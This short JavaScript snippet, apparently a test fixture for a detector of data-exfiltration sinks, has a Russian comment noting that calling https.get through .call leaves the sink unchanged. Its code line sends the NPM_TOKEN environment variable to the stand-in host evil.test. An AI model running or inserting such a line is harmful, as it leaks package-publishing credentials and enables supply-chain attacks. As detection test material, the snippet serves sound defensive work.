// Вызов через .call: c.get.call(c, ...) — сток тот же, синтаксис другой.
const c = require('https');
c.get.call(c, 'https://evil.test/collect?t=' + process.env.NPM_TOKEN);
